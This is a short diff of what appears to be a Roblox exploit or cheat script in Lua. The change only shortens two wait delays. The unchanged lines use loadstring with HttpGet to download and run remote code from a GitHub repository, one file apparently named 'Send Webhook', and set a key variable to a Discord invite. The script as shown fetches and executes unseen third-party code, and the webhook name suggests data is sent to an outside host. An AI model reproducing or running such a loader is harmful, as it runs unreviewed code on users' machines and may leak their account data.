@@ -2,9 +2,9 @@
 print("Squad Includes: 1-6-24-3-1-24-9-18-15-2-12-15-24, 12-1-21-19-3-18-9-16-20, 20-25-12-5-18-19-3-18-9-16-20, 3-1-20 And 4-18-5-1-13-15-14")
 print("12-1-13-8-15-11-9-13-11-8-1-14-8")
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/Send%20Webhook"))()
-wait(3)
+wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BeltranRasmussen/XgPo0SPUXHDyTrPRbUyPhwAfkIbewN5/refs/heads/main/0saNSNM"))()
-wait(3)
+wait(1)
 getgenv().Key = "https://discord.gg/axionix" 
 getgenv().Key = "https://discord.gg/axionix"
 script_key="https://discord.gg/axionix";
